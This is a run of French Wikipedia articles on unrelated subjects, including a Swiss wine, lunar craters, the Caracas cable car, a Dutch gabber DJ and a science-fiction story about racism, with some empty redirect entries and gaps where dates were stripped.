Ce grand cru est apprécié à l'apéritif et se révèle parfait en accompagnement des poissons du lac (perche, omble chevalier, fera). Sa structure et sa puissance (12,5°), lui permette de mettre en valeur les viandes blanches, les salades de saison ainsi que les fromages à pâtes dures, en particulier le jeune gruyère. Sa température idéale de service se situe entre 10 et 12 °C. Il s'épanouit en bouteille entre 2 et 5 ans.
Liste des producteurs.
Voici quelques producteurs de l'AOC grand cru Calamin :
Distinction.
Le vignoble de Calamin fait partie des vignobles en terrasses classés par l'UNESCO au patrimoine mondial de l'humanité.

</doc>
<doc id="6805117" url="https://fr.wikipedia.org/wiki?curid=6805117" title="Kazuyoshi Sekine">
Kazuyoshi Sekine

, aussi connu sous le nom Kazumi Sekine, est un réalisateur, un dramaturge, un producteur de cinéma japonais, président de la .
Biographie.
Kazuyoshi Sekine dirige principalement des films produits par des studios de cinéma indépendant.
Il est marié à l'actrice Izumi Aki qui apparaît dans ses films.
Beaucoup de ses films sont des histoires d'amour en milieu urbain.

</doc>
<doc id="6805121" url="https://fr.wikipedia.org/wiki?curid=6805121" title="François de Schaetzen">
François de Schaetzen

Le baron François de Schaetzen, né le à Tongres et y mort le est homme politique belge flamand, membre du parti catholique.
Biographie.
François Joseph Oscar Marie, baron de Schaetzen, né le à Tongres est le fils d'Oscar de Schaetzen, chevalier (1836-1907) et de "Marie-Hubertine de Corswarem" (1845-1919). En 1902, il épouse en 1902 Maria Roelants (1879-1960) qui lui donne trois fils : Philippe, baron (1903-1973), Xavier, chevalier (1905-1982), Guy, chevalier, Président de la Cour de Cassation (1913-1984).
Docteur en droit (ULg), il est commissaire d'arrondissement. Il est créé baron en 1929.

</doc>
<doc id="6805129" url="https://fr.wikipedia.org/wiki?curid=6805129" title="Niche Copé">
Niche Copé

La niche Copé est un mécanisme d'exonération fiscale en faveur des entreprises françaises, voté à l'occasion de la loi de finances pour 2005 de et promue par le ministre du budget de l'époque, Jean-François Copé.
Principe de l'exonération fiscale.
La « niche Copé » est une exonération de l'impôt sur les sociétés (lequel avait alors un taux de 33,3 % en France) concernant les plus-values encaissées par des personnes morales soumises à l'impôt sur les sociétés, et spécialement les holdings, en cas de vente de titres de participation détenus depuis plus de deux ans (plus-values à long terme sur titres de participation).
Il s'agit d'un dispositif « d’attractivité fiscale » tendant à aligner la France sur le régime plus favorable de ses voisins (Pays-Bas, Belgique, Allemagne, etc), afin que les grands groupes évitent d'effectuer leurs cessions de participations à l'étranger.
Juridiquement, le mécanisme consiste à exonérer d'impôt la plus-value réalisée dans la main de la société cédante, sous réserve de retraiter le résultat fiscal de la société en y réintégrant une quote-part de frais et charges d'un montant de 12 % de la plus-value. Ainsi, la plus-value en elle-même est exonérée, mais 12 % de son montant est ajouté au résultat de l'entreprise et soumis à l'impôt sur les sociétés.
Economiquement, le dispositif revient ainsi à exonérer les plus-values à long terme sur titres de participation à 88 % d'impôt sur les plus-values.
Évolution de la mesure.
Fin 2012, à l'occasion du vote de la loi de finances pour 2013, le gouvernement a proposé au Parlement, non pas de supprimer cette exonération, mais de la plafonner.
Critique et effets pervers de la niche Copé.
En France, selon la mission d'information commune sur le bilan de la lutte contre les montages transfrontaliers, l'articulation de la niche Copé à la possibilité de déduire des charges financières de la taxation ou de l'impôt, a encouragé des "montages transfrontaliers" aux limites de la légalité, voire illégaux, visant exclusivement à échapper à la taxation des profits, ce qui prive les caisses de l'État d'une part légitime de ses revenus, et/ou encourage le financement des entreprises par la dette plutôt que par des fonds propres, au-delà de toute rationalité économique.

</doc>
<doc id="6805130" url="https://fr.wikipedia.org/wiki?curid=6805130" title="Maison Thorens">
Maison Thorens

La maison Thorens, précédemment appelée maison Steiner, est un bâtiment situé au centre de la ville vaudoise d'Yverdon-les-Bains, en Suisse.
Histoire.
La maison Thorens, avec sa cour intérieure de style italien et garnie de peinture murales, a été bâtie peu avant 1800.
En , la maison devient le siège d'une école privée Rudolf Steiner ; l'établissement déménagera en 2009 pour le château d'Ependes, situé un peu en dehors de la ville.
Le bâtiment, est inscrit comme bien culturel suisse d'importance nationale. 

</doc>
<doc id="6805131" url="https://fr.wikipedia.org/wiki?curid=6805131" title="Les Montagnards de la nuit">
Les Montagnards de la nuit

Les Montagnards de la nuit est un roman de Roger Frison-Roche publié aux éditions Arthaud en 1968. Il décrit la vie de la résistance française en Savoie durant la Seconde Guerre mondiale.
Le roman de Roger Frison-Roche évoque un bastion de la résistance en Savoie durant la Seconde Guerre mondiale. Les « montagnards de la nuit » sont les ouvriers travaillant au chantier du barrage de la Girotte, pour le compte des Aciéries d'Ugine. Cent cinquante d'entre eux forment la compagnie du Lac, dirigée par le Commandant Bulle, qui va libérer ensuite Albertville et d'autres villes de Savoie.
La compagnie du Lac, qui est un maquis-silo, sert de point d'appui aux maquis dormants. Les ouvriers ont le droit de se déplacer et ont droit à des tickets de rationnement en quantité, en raison de l'altitude, car l'usine d'Ugine est considérée comme prioritaire par l'Occupant qui y fabrique des aciers spéciaux. Le , un très important parachutage de matériel et d’armes se fera juste en face du lac, au col des Saisies, ce qui permettra d’équiper environ des différents maquis du val d’Arly jusqu’à la Maurienne, afin d’accélérer la Libération de la Savoie.

</doc>
<doc id="6805132" url="https://fr.wikipedia.org/wiki?curid=6805132" title="Tetsuo Shinohara">
Tetsuo Shinohara

, né le à Tokyo, est un réalisateur japonais.
Biographie.
Tetsuo Shinohara fait ses études à l'université Meiji. Son film "First Love" est couronné troisième meilleur film lors de la du festival du film de Yokohama.

</doc>
<doc id="6805135" url="https://fr.wikipedia.org/wiki?curid=6805135" title="Montagnards de la nuit">
Montagnards de la nuit



</doc>
<doc id="6805136" url="https://fr.wikipedia.org/wiki?curid=6805136" title="Les montagnards de la nuit">
Les montagnards de la nuit



</doc>
<doc id="6805138" url="https://fr.wikipedia.org/wiki?curid=6805138" title="Les Montagnards de la Nuit">
Les Montagnards de la Nuit



</doc>
<doc id="6805144" url="https://fr.wikipedia.org/wiki?curid=6805144" title="Nummela">
Nummela

Nummela est la plus grande agglomération de la municipalité de Vihti en Finlande.
Description.
Elle est située dans la triangle formé par la nationale 1, de la nationale 2 et la nationale 25 dans la région de Uusimaa à d’Helsinki.
Nummela a environ (2012).
Nummela est née au bord de la voie ferrée Hanko-Hyvinkää à la fin du .

</doc>
<doc id="6805145" url="https://fr.wikipedia.org/wiki?curid=6805145" title="Maunder (cratère lunaire)">
Maunder (cratère lunaire)

Maunder est un cratère lunaire situé à l'extrême ouest de la face visible de la Lune. Il est visible quand la libration de la Lune le permet. Il se trouve à l'intérieur du massif montagneux des Montes Cordillera situé autour de la Mare Orientale. Au Sud se trouvent les cratères Kopff et Lallemand. Au Nord, le long de la Mare Orientale, se trouve le cratère Couder. Depuis 1985, le cratère satellite "Maunder Z" est identifié sous l'appellation Couder. Le contour du cratère Maunder est à peu près circulaire, avec une arête vive qui n'a pas été significativement érodé. Les parois intérieurs sont un peu en terrasses et s'affaissent vers le bas sur le plancher intérieur. Au milieu du cratère s'élève un double pic central, avec la pointe nord plus haute que l'autre.
En 1970, l'Union astronomique internationale lui a attribué le nom de Maunder en l'honneur des astronomes anglais Edward Maunder et Annie Maunder.
Par convention, les cratères satellites sont identifiés sur les cartes lunaires en plaçant la lettre sur le côté du point central du cratère qui est le plus proche de Maunder.

</doc>
<doc id="6805146" url="https://fr.wikipedia.org/wiki?curid=6805146" title="Tournoi de clôture du championnat d'Argentine de football 2009">
Tournoi de clôture du championnat d'Argentine de football 2009

Le tournoi de clôture de la saison 2009 du Championnat d'Argentine de football est le second tournoi semestriel de la du championnat de première division en Argentine. Les vingt équipes sont regroupées au sein d'une poule unique où elles affrontent une fois chacun de leurs adversaires. Un classement cumulé sur les trois dernières années permet de déterminer les deux équipes reléguées à l'issue du tournoi ainsi que les deux formations engagées en barrage de promotion-relégation, mis en place à partir de cette saison.
C'est le club de Vélez Sarsfield qui remporte le tournoi après avoir terminé en tête du classement final, avec deux points d'avance sur un duo composé du Huracán et du Lanús. C'est le septième titre de champion d'Argentine de l'histoire du club.
Qualifications continentales.
Le vainqueur du tournoi Clôture obtient son billet pour la Copa Libertadores 2010. En ce qui concerne la Copa Sudamericana 2009, la fédération argentine peut aligner 6 équipes qui sont les cinq premières du classement cumulé (Ouverture et Clôture) plus River Plate, club invité par la CONMEBOL.
Compétition.
Le barème utilisé pour établir le classement est le suivant :
Classement cumulé.
Un classement cumulé des tournois Ouverture et Clôture permet de déterminer les équipes qualifiées pour la Copa Sudamericana 2009.
Table de relégation.
Un classement cumulé des trois dernières saisons du championnat permet de déterminer les deux équipes reléguées en "Primera B" et les deux qui doivent disputer un barrage de promotion-relégation. 

</doc>
<doc id="6805150" url="https://fr.wikipedia.org/wiki?curid=6805150" title="Lights...Camera...Revolution!">
Lights...Camera...Revolution!

Lights...Camera...Revolution est le studio du groupe de crossover thrash californien Suicidal Tendencies. Il est sorti le sur le label Epic Records et a été produit par Mark Dobson et le groupe.
Historique.
Il est le premier album avec le bassiste Robert Trujillo et fut enregistré entre et avril 1990 dans les studios Rumbo Recorders de Canoga Park et les studios Amigo de Hollywood.
Cet album fut nommé dans la catégorie Grammy Award de la meilleure prestation metal aux Grammy Awards de 1991. Il se hissa à la 101 place du Billboard 200 aux États-Unis et sera certifié disque d'or le . En Europe, il se classa à la place des charts britanniques. Le single "Send Me Your Money", un pamphlet qui dénonce le télévangélisme, se classa à la place au Royaume-Uni.
Il est le dernier album avec le batteur R.J. Herrera qui quitta le groupe peu avant l'enregistrement de l'album suivant.

</doc>
<doc id="6805151" url="https://fr.wikipedia.org/wiki?curid=6805151" title="David Bretherton">
David Bretherton

David Bretherton est un monteur américain, né le à Los Angeles (Californie), ville où il est mort le , d'une pneumonie.
Biographie.
Fils du monteur et réalisateur Howard Bretherton (1890-1969), David Bretherton débute lui-même comme monteur sur un documentaire sorti en 1955. Puis il contribue à quarante-neuf films, majoritairement américains, le premier étant "Le Fond de la bouteille" d'Henry Hathaway (1956, avec Van Johnson et Joseph Cotten).
S'y ajoutent quelques coproductions (dont le film franco-italo-américain "Le Train" de John Frankenheimer et Bernard Farrel en 1964, avec Burt Lancaster et Paul Scofield) et le film britannique "La Grande Attaque du train d'or" de Michael Crichton (1979, avec Sean Connery et Donald Sutherland).
Parmi ses autres films notables, citons "Les Plaisirs de l'enfer" de Mark Robson (1957, avec Lana Turner et Diane Varsi), "Le Milliardaire" de George Cukor (1960, avec Marilyn Monroe et Yves Montand), "Le Chevalier des sables" de Vincente Minnelli (1965, avec Elizabeth Taylor et Richard Burton), "Cabaret" de Bob Fosse (1972, avec Liza Minnelli et Michael York), ou encore "Au-delà de la gloire" de Samuel Fuller (1980, avec Lee Marvin et Mark Hamill).
Ses trois derniers films, réalisés par Harold Becker, sont "Mélodie pour un meurtre" (1989, avec Al Pacino et Ellen Barkin), "Malice" (coproduction américano-canadienne, 1993, avec Alec Baldwin et Nicole Kidman) et "City Hall" (1996, avec Al Pacino et John Cusack).
Le film musical "Cabaret" pré-cité permet à David Bretherton de gagner l'Oscar du meilleur montage en 1973, et d'obtenir une nomination au British Academy Film Award du meilleur montage, cette même année.

</doc>
<doc id="6805153" url="https://fr.wikipedia.org/wiki?curid=6805153" title="Lorenzo F. Díaz">
Lorenzo F. Díaz

Lorenzo F. Díaz, né en 1959 en Espagne, est un dessinateur et un scénariste de bande dessinée espagnol.

</doc>
<doc id="6805154" url="https://fr.wikipedia.org/wiki?curid=6805154" title="Bet-hedging">
Bet-hedging



</doc>
<doc id="6805155" url="https://fr.wikipedia.org/wiki?curid=6805155" title="George Bellairs">
George Bellairs

George Bellairs, nom de plume de Harold Blundell (Heywood, Grand Manchester, - Île de Man, ), est un écrivain britannique de roman policier.
Biographie.
Après des études supérieures à la London School of Economics, dont il obtient un diplôme en 1928, il se destine au milieu bancaire. Sa carrière est couronnée de succès quand, en 1953, il devient le directeur d'une succursale de Manchester. À sa retraite, en 1962, Blundell s'installe à l'île de Man et devient écrivain à plein temps, mais voyage aussi beaucoup en Europe avec sa femme. Il décède en 1982.
En marge de ses fonctions officielles, le banquier Blundell est également, sous le pseudonyme de George Bellairs, le créateur, dès 1941, de l'inspecteur Thomas Littlejohn, héros de cinquante-cinq romans policiers. Ce modèle d'intégrité, fort estimé de ses collègues, obtient bientôt le grade de superintendant en reconnaissance de son talent de fin limier. Il est parfois secondé par sa femme, Letty, lorsqu'un crime est commis alors que le couple quitte sa résidence de Londres pour voyager en France ou à l'île de Man. La série des Littlejohn propose des whodunits classiques, teintés d'un humour feutré, aux personnages excentriques. « Ses romans, plutôt dynamiques, démarrent toujours dans les dix premières pages et conservent un rythme soutenu. Mais ils ne laissent pas un souvenir impérissable... ».

</doc>
<doc id="6805163" url="https://fr.wikipedia.org/wiki?curid=6805163" title="This Is 40">
This Is 40



</doc>
<doc id="6805164" url="https://fr.wikipedia.org/wiki?curid=6805164" title="Hoornes-Rijnsoever">
Hoornes-Rijnsoever



</doc>
<doc id="6805167" url="https://fr.wikipedia.org/wiki?curid=6805167" title="Bibliothèque publique d'Yverdon-les-Bains">
Bibliothèque publique d'Yverdon-les-Bains

La bibliothèque publique et scolaire d'Yverdon-les-Bains est une bibliothèque située sur le territoire de la ville vaudoise d'Yverdon-les-Bains, en Suisse.
Histoire.
C'est en 1761 qu'est fondée la bibliothèque d'Yverdon, créée afin . Devenue publique deux ans plus tard, elle a ensuite déménagé à de nombreuses reprises, en particulier à l'hôtel de ville et au château avant de s'installer, en 1986, dans les locaux de l'ancienne poste qu'elle occupe encore au et dont les façades ont été entièrement rénovées en 2012.
Outre les documents qu'elle possède, la bibliothèque offre également une salle de lecture avec connexion à Internet ; des expositions, des ateliers ainsi que des conférences y sont régulièrement organisés.
Collections.
Classée comme bien culturel suisse d'importance nationale, la bibliothèque possède deux fonds : un fonds dit « moderne » divisé en 6 sections, ainsi qu'un fonds ancien, riche d'environ allant du au et soutenu par une fondation qui prend en charge le financement lié à la restauration des ouvrages anciens.

</doc>
<doc id="6805169" url="https://fr.wikipedia.org/wiki?curid=6805169" title="Kopff (cratère)">
Kopff (cratère)

Kopff est un cratère lunaire situé à l'extrême ouest de la face visible de la Lune. Il est visible quand la libration de la Lune le permet. Il se trouve à l'intérieur du massif montagneux des Montes Cordillera situé autour de la Mare Orientale. Au Nord se trouvent les cratères Maunder et Couder. Ce cratère a été considéré comme ayant été formé par l'activité volcanique, à la différence des cratères lunaires qui sont plus considérés comme ayant été créés par des impacts. Cependant, il est plus probable que le cratère a été formé par un choc contre une surface qui était encore partiellement fondu. Cela a laissé au cratère un contour tranchant et circulaire avec un plancher intérieur plat aux teintes sombres. En effet, l'albédo du sol intérieur correspond à celui de la mare lunaire située juste à l'ouest. 
En 1970, l'Union astronomique internationale lui a attribué le nom de Maunder en l'honneur de l'astronome allemand August Kopff.
Par convention, les cratères satellites sont identifiés sur les cartes lunaires en plaçant la lettre sur le côté du point central du cratère qui est le plus proche de Kopff.
Le cratère satellite « Kopff A » a été dénommé Lallemand par l'Union astronomique internationale, en 1985 en l'honneur de l'astronome français André Lallemand.

</doc>
<doc id="6805179" url="https://fr.wikipedia.org/wiki?curid=6805179" title="Téléphérique de Caracas">
Téléphérique de Caracas

Le téléphérique de Caracas ou téléphérique Warairarepano, en espagnol ' et ' est une remontée mécanique du Venezuela de type télécabine reliant Caracas, la capitale, à Macuto, une ville sur la côte de la mer des Caraïbes, via le Cerro El Ávila, un sommet de la cordillère de la Costa dans le parc national El Ávila. Inauguré en 1955, il est reconstruit à partir de 2000.
Parcours.
La télécabine relie Caracas, la capitale du Venezuela située à l'intérieur des terres, à Macuto, une petite ville côtière située sur la mer des Caraïbes. Entre les deux s'élève la cordillère de la Costa, une chaîne de montagnes culminant à plus de mètres d'altitude.
La remontée mécanique débute à Caracas, sur le rebord septentrional de l'agglomération, à l'intersection des avenues Boyacá et Principal Maripérez, au pied des montagnes. Les cabines gagnent très vite de l'altitude en empruntant plusieurs pylônes. Cette première section longue de 3,5 kilomètres pour un dénivelé de près de mètres est parcourue en environ quinze minutes. Au Cerro El Ávila, à mètres d'altitude, se trouve une gare intermédiaire qui dessert l' et le parc national El Ávila. De là, par beau temps, le point de vue permet une vue panoramique sur Caracas et la mer des Caraïbes.
La télécabine redescend ensuite de l'autre côté des montagnes en direction du littoral et arrive à Macuto, sur la subida Teleférico, à environ 120 mètres d'altitude soit près de mètres de dénivelé. Dans ce secteur, la côte est constituée de plages bordées d'hôtels, de résidences et de restaurants.
Caractéristiques.
La remontée mécanique est une télécabine constitué de deux sections séparées par une gare intermédiaire.
Histoire.
Inaugurée le , la remontée mécanique est à l'origine un téléphérique, qui est fermé à la fin des années 1970 et rouvert plusieurs fois en 1986, en 1988 et en 1990. En 2000, l'État vénézuélien concède l'exploitation du téléphérique à la société "" sous condition qu'elle le reconstruise. Les travaux qui transforment la remontée en télécabine ne concerneront finalement que la section de Caracas au Cerro El Ávila, ce qui décide le gouvernement à reprendre le contrôle de la remontée mécanique et à engager les travaux de la seconde section. La rénovation de la télécabine va de pair avec la reconstruction de l'hôtel Humboldt sur le Cerro El Ávila et la redynamisation du parc national El Ávila créé en 1958.

</doc>
<doc id="6805182" url="https://fr.wikipedia.org/wiki?curid=6805182" title="Téléphérique Warairarepano">
Téléphérique Warairarepano



</doc>
<doc id="6805183" url="https://fr.wikipedia.org/wiki?curid=6805183" title="Teleférico de Caracas">
Teleférico de Caracas



</doc>
<doc id="6805184" url="https://fr.wikipedia.org/wiki?curid=6805184" title="Teleférico Warairarepano">
Teleférico Warairarepano



</doc>
<doc id="6805185" url="https://fr.wikipedia.org/wiki?curid=6805185" title="Kei Fujiwara">
Kei Fujiwara

, née le , est une actrice, directrice de la photographie, monteuse, scénariste et réalisatrice japonaise.
Biographie.
Kei Fujiwara interprète son premier rôle au cinéma dans le film américain, "Odyssée sous la mer", mais elle est plus connue pour son rôle dans le film culte japonais, "Tetsuo". Récemment, elle consacre son temps à l'écriture et la réalisation, et est connue pour ses films expérimentaux surréalistes et violents.

</doc>
<doc id="6805186" url="https://fr.wikipedia.org/wiki?curid=6805186" title="Vacances Animées">
Vacances Animées



</doc>
<doc id="6805188" url="https://fr.wikipedia.org/wiki?curid=6805188" title="K Sint-Eloois-Winkel Sport">
K Sint-Eloois-Winkel Sport



</doc>
<doc id="6805195" url="https://fr.wikipedia.org/wiki?curid=6805195" title="Gizmo (DJ)">
Gizmo (DJ)

DJ Gizmo, de son vrai nom Ferry Salee, est un producteur et disc jockey de hardstyle néerlandais né le à La Haye.
Avec The Dark Raver, il est considéré par la presse spécialisée néerlandaise comme l'un des deux principaux représentants de la scène gabber de La Haye.
Biographie.
Né en 1965 à La Haye, d'origine indonésienne, Ferry Salee est très tôt attiré par la musique. Dès l'âge de douze ans, il monte avec un groupe d'amis une discothèque "drive-in" à La Haye, où ils passent du disco, de la soul et du funk. Ils animent alors des soirées de clubs de foot ou de hockey. C'est par ce biais qu'en 1979, il est recruté par le Rollerdisco de Scheveningen. Trop occupé par ses activités de DJ, Ferry Salee quitte le système scolaire sans diplôme. En 1986, il entre comme DJ au Club 61. En 1988, il commence à produire ses propres compositions hard house.
Sa plus retentissante collaboration est celle l'impliquant dans la Dreamteam d'ID&amp;T, mais Gizmo a également travaillé conjointement avec Buzz Fuzz, avec lequel il forme le groupe Square Dimensione. Entre 1991 et 1992, Gizmo, R. Abels, Michael van Wijngaarden et Jerry Wolff sortent deux maxis sous le nom de 909 Bass Line. Avec Buzz Fuzz, Rob Gee, DJ Delirium, Charly Lownoise et Mental Theo, il forme le collectif Mental Hardcore Associates, qui sort le 12" "". En collaboration avec le producteur néerlandais Maarten Visser, Gizmo sort également deux maxis sous le nom de Éch Heftag. En 1995, il reçoit le titre de meilleur DJ international en Suisse. En 1996, Gizmo monte son propre label, Gizmania Records, suivi en 1997 par Gizmania-X Records. Le catalogue reste toutefois très limité, cinq ou six références de Gizmo et de DJ Norman.
Dans les années 2000, Gizmo publie sporadiquement quelques EP dont ' (2003) et ' (2004). En 2006, il se met au hardstyle collaborant avec Showtek pour l'EP "" (2006). Une compilation de ses meilleures compositions enregistrées entre 1992 et 1999, intitulée "The Best of Gizmo - The Collected Works '92 - '99", est publiée.
Style musical.
À ses débuts, Gizmo est inspiré par des musiciens comme Robin Albers, Alex van Oosterom, King Bee et Peter Slaghuis. Aux commencement de la vague de la culture gabber aux Pays-Bas dans les années 1990, Gizmo se produit au Parkzicht, se trouvant alors à la pointe du style gabber. Conjointement avec Buzz Fuzz, DJ Dano et The Prophet, ils forment la Dreamteam, qui fera les beaux jours des premières compilations "Thunderdome". Gizmo participe entre 2001 et 2005 au programme "Hardhouse Generation" sur Fresh FM, conjointement avec Norman, The Dark Raver, Cor de Splinter et DJ Sixpack. Il s'est fortement investi lors d'événements comme Rave the City, Thunderdome, Defqon.1 et Mystery Land, organisés par ID&amp;T.

</doc>
<doc id="6805196" url="https://fr.wikipedia.org/wiki?curid=6805196" title="Ferry Salee">
Ferry Salee



</doc>
<doc id="6805197" url="https://fr.wikipedia.org/wiki?curid=6805197" title="Charles Henderson (personnage de fiction)">
Charles Henderson (personnage de fiction)

Charles Henderson est un personnage de la série de romans "Henderson's Boys" de Robert Muchamore.
Jeunesse.
Henderson suit des cours à la Burghley Road Grammar school qu'il quitte à l'âge de quinze ans. Il travaille brièvement dans une forge avant de s'engager dans la Royal Navy. Il sert dans différents bateaux et devient lorsqu'il a à peine vingt ans commandant. Il décline deux propositions de capitaine. Malheureusement ses compétences linguistiques très avancées étaient plus adaptées à un travail bureaucratique. En 1935, il est affilié dans l'Unité de Renseignement des Services Secrets de la Navy. 
Enseignement.
Henderson a un don inné pour les langues. Il sait parler les cinq langues principales européennes et va jusqu'à imiter certains accents régionaux. Il est admirablement fort.
Apparitions.
L'Évasion.
Henderson est envoyé en mission en France occupée. Il doit retrouver deux jeunes Anglais, Paul et Rosie Clarke, traqués par les Nazis. Il se retrouve à demander de l'aide à un jeune orphelin français, Marc. Henderson doit rejoindre les deux enfants car ils détiennent des plans de radios essentiels aux services secrets britanniques qui doivent être ramenés en Angleterre. Henderson emmène les trois adolescents jusqu'à Bordeaux où seuls Rosie et Paul ont pu monter dans un bateau car Marc n'avait pas de papiers. Henderson décide de rester en France avec le jeune homme.
Le Jour de l'aigle.
Henderson doit trouver les plans d'invasion de l'Angleterre et les remettre aux services secrets. Pour y parvenir, il prend un travail de traducteur pour les Allemands où il a accès à ces plans. Marc obtient également un travail de traducteur et assiste Henderson dans sa mission. À la fin du livre, Henderson retourne en Angleterre avec les documents. Il affirme qu'une mission plus longue en France occupée serait un suicide.
L'Armée secrète.
Henderson essaye désespérément de faire passer les tests de parachutisme au groupe A pour les faire parachuter en France occupée mais sans espoir jusqu'à ce que Marc sauve un haut gradé de l'incendie du club dans lequel ils passaient la nuit.
Opération U-Boot.
Henderson est chargé de mener une opération secrète avec six agents de CHERUB ayant pour but de saboter les bases de sous-marins U-Boot à Lorient. À son retour au Royaume-Uni, il est promu au grade de capitaine.
Décès.
Charles Henderson est tué en 1946 par sa femme avec une arme à feu. Son fils (futur directeur de CHERUB) se voit confié à Eileen McAfferty. Sa femme est envoyée dans un hôpital psychiatrique.

</doc>
<doc id="6805201" url="https://fr.wikipedia.org/wiki?curid=6805201" title="Alastair Mackenzie">
Alastair Mackenzie

Alastair Mackenzie (né le à Trinafour, Perth and Kinross, en Écosse) est un acteur de télévision britannique.

</doc>
<doc id="6805206" url="https://fr.wikipedia.org/wiki?curid=6805206" title="Chrysé">
Chrysé

Dans la mythologie grecque, Chrysé (en ) est une ville d'une île située en Mysie près de Troie qui abritait un temple d'Apollon dont Chrysès était le prêtre.
Lors de la guerre de Troie, les Grecs pillèrent la ville, tuèrent Épistrophe, l'époux de Chryséis, la fille du prêtre Chrysès, et la donnèrent en cadeau au roi Agamemnon.

</doc>
<doc id="6805209" url="https://fr.wikipedia.org/wiki?curid=6805209" title="Lallemand (cratère)">
Lallemand (cratère)

Lallemand est un cratère lunaire situé à l'extrême ouest de la face visible de la Lune. Il est visible quand la libration de la Lune le permet. Il se trouve à l'intérieur du massif montagneux des Montes Cordillera situé autour de la Mare Orientale. Il est situé juste à côté du cratère Kopff dont il était, avant 1985, un cratère satellite dénommé « Kopff A ». Au Nord se trouvent les cratères Maunder et Couder. Le cratère Lallemand a une forme de cuvette et possède un contour à peu près circulaire. Il se situe le long de la limite nord-est des Montes Rook. Au nord-ouest s'étend le Lacus Autumni et au nord-ouest le Lacus Veris.
En 1985, l'Union astronomique internationale lui a attribué le nom de Lallemand en l'honneur de l'astronome français André Lallemand. 
Le cratère satellite « Kopff A » a été dénommé Lallemand par l'Union astronomique internationale, en 1985 en l'honneur de l'astronome français André Lallemand.

</doc>
<doc id="6805210" url="https://fr.wikipedia.org/wiki?curid=6805210" title="Unité urbaine de Castelsarrasin">
Unité urbaine de Castelsarrasin

L'unité urbaine de Castelsarrasin est une unité urbaine française centrée sur Castelsarrasin, la sous-préfecture du Tarn-et-Garonne, au cœur de la deuxième agglomération urbaine du département.
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de deux communes.
Dans le nouveau zonage réalisé en 2020, elle est composée des deux mêmes communes.
En , avec , elle représente la unité urbaine du département de Tarn-et-Garonne et occupe le dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 4,38 % du territoire départemental mais, par sa population, elle regroupe 10,56 % de la population du département de Tarn-et-Garonne.
Composition 2020 de l'unité urbaine.
Elle est composée des deux communes suivantes :

</doc>
<doc id="6805219" url="https://fr.wikipedia.org/wiki?curid=6805219" title="Église Saint-Jean-Baptiste de Balan (Ain)">
Église Saint-Jean-Baptiste de Balan (Ain)

L'église Saint-Jean-Baptiste de Balan est une église du , remaniée à de multiples occasions. Elle est située à Balan dans le département de l'Ain.
Affectée au culte catholique, elle dépend du groupement paroissial de Montluel, au sein du diocèse de Belley-Ars dans l'archidiocèse de Lyon.
Histoire.
La première mention de l'église date de 1187. En 1206, l'archevêque de Lyon Renaud II de Forez fait l'acquisition de nouveaux fonds à Balan ; il semble donc que dès cette période l'archevêché de Lyon, eut une certaine influence sur la vie paroissiale et sur l'église Saint-Jean-Baptiste en particulier. En 1613, on signale que la chapelle Sud est dédiée à Notre-Dame de Grâce, alors que l'église elle-même est déjà dédiée à saint Jean-Baptiste. La chapelle Nord, aurait été édifiée seulement au .
À partir du , l'Histoire de l'église devient surtout celle de ses restaurations et remaniements successifs : en 1863, de gros travaux de rénovation sont entrepris impliquant notamment la reconstitution du chœur ainsi que des travaux relatifs au porche, le clocher est de 1869 ; en , le chœur est (à nouveau) restauré (par l'entreprise Jean Bonési de La Boisse et à l'initiative du curé Dondé). Enfin, en 1970, la restauration de l'église se poursuit avec notamment la réfection de la nef.
Description.
Intérieur.
Un chemin de croix est visible à l'intérieur de l'église.

</doc>
<doc id="6805255" url="https://fr.wikipedia.org/wiki?curid=6805255" title="Sombre Interlude">
Sombre Interlude

Sombre Interlude (titre original : "Dark Interlude") est une nouvelle de science-fiction coécrite par Fredric Brown et Mack Reynolds.
Le récit a été rédigé pendant la ségrégation raciale. Elle met en exergue le racisme des « petits blancs » du sud des États-Unis qui haïssent les Noirs et la notion d'Étranger.
Parutions.
Parutions aux États-Unis.
La nouvelle est parue sous le titre "Dark Interlude" dans "Galaxy Science Fiction" en . 
Au total, la nouvelle a été publiée à une vingtaine de reprises dans des recueils des deux coauteurs, ou des anthologies regroupant des nouvelles connues.
Parutions en France.
La nouvelle a été publiée en France en 1954 sous le titre "Sombre Intermède".
Sous le titre de "Sombre Interlude", elle a été de nouveau publiée, avec une traduction de Jean Sendy, dans le recueil "Histoires de voyages dans le temps" ainsi que dans le recueil "Fantômes et Farfafouilles".
Résumé.
La nouvelle est entrecoupée entre, d'une part une conversation entre Lou Allenby et le shérif du comté, et d'autre part par le récit des événements effectué par l'auteur de manière neutre.
 ans dans le futur : des scientifiques décident d'envoyer un chercheur dans le passé pour comprendre comment vivaient les gens de l'époque appelée « ». Ce chercheur, volontaire, s'appelle Jan. Envoyé dans le passé, il ne pourra pas rentrer à son époque et devra passer toute sa vie au : il écrira son rapport et le placera en un lieu prédéterminé d'où il sera déterré quatre millénaires plus tard.
Le voyage a lieu, Jan atterrit en plein champ, mais se casse la cheville. Susan Allenby, qui passe par là, vient à son secours. Jan finit par lui raconter la vérité sur sa venue. Susan ne tarde pas à tomber amoureuse de lui. Deux jours plus tard, ils décident de se marier. Susan téléphone à son frère Lou pour lui expliquer le sens heureux des événements.
Lorsque Lou rencontre Jan, tout se passe à merveille, jusqu'au moment où Jan révèle innocemment à Lou qu'à la suite de diverses guerres au cours des et siècles, toutes les races se sont fondues en une seule et que lui, Jan, a « au moins un tiers de sang noir ». Entendant ça, Lou perd tout contrôle et assassine sauvagement Jan avec son fusil, au grand désespoir de sa sœur.
Le dernier paragraphe de la nouvelle constitue la remarque finale du shérif, très « compréhensif » : 
Il t'avait peut-être fait avaler trop de ses boniments. Arriver de l'avenir, tiens ! Ces salopards de négros, ça va chercher n'importe quoi, pour se faire passer pour des blancs. Ça prouve quoi, ses traces commençant au milieu du champ ? Rien du tout, petit ! Personne n'est jamais arrivé de l'avenir, et personne ira jamais dans l'avenir. On va étouffer ça gentiment et personne n'en entendra jamais parler. Ce sera comme si c'était jamais arrivé.

</doc>
<doc id="6805258" url="https://fr.wikipedia.org/wiki?curid=6805258" title="Annie Scott Dill Maunder">
Annie Scott Dill Maunder

Annie Scott Dill Maunder, née Russell, le et morte le , est une astronome et mathématicienne nord-irlandaise.
Biographie.
Annie Russell est née à Strabane dans le comté de Tyrone en Irlande. Elle a suivi ses études secondaires à Belfast puis universitaire au Girton College de l'université de Cambridge d'où elle ressortira diplômée en mathématiques.
